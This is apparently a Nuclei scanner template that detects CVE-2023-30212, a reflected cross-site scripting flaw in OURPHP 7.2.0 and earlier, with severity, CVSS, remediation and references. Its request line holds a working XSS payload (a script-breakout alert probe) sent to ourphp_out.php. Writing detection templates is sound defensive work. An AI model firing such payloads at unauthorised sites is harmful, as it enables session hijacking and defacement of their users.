id: CVE-2023-30212

info:
  name: OURPHP <= 7.2.0 - Cross Site Scripting
  author: theamanrawat
  severity: medium
  description: |
    OURPHP <= 7.2.0 is vulnerale to Cross Site Scripting (XSS) via /client/manage/ourphp_out.php.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to inject malicious scripts into web pages viewed by users, leading to potential data theft, session hijacking, or defacement of the affected website.
  remediation: |
    Upgrade to a patched version of OURPHP (7.2.1 or higher) to mitigate this vulnerability.
  reference:
    - https://www.ourphp.net/
    - https://wanheiqiyihu.top/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/
    - https://nvd.nist.gov/vuln/detail/CVE-2023-30212
    - https://github.com/JasaluRah/Creating-a-Vulnerable-Docker-Environment-CVE-2023-30212-
    - https://github.com/arunsnap/CVE-2023-30212-POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-30212
    cwe-id: CWE-79
    epss-score: 0.66021
    epss-percentile: 0.98431
    cpe: cpe:2.3:a:ourphp:ourphp:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: ourphp
    product: ourphp
  tags: cve2023,cve,xss,ourphp,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/client/manage/ourphp_out.php?ourphp_admin=logout&out=</script><script>alert(document.domain)</script>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "location.href='../..</script><script>alert(document.domain)</script>'"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100ea52b3cffe079256ff52fd95b9607da2a0eea19e2b89bf7c7639121631df6dac022037ae0d2ad6a77aa4dc5ac47b86ee31d439ad1aef325fc947a7de5ff094dd920d:922c64590222798bb761d5b6d8e72950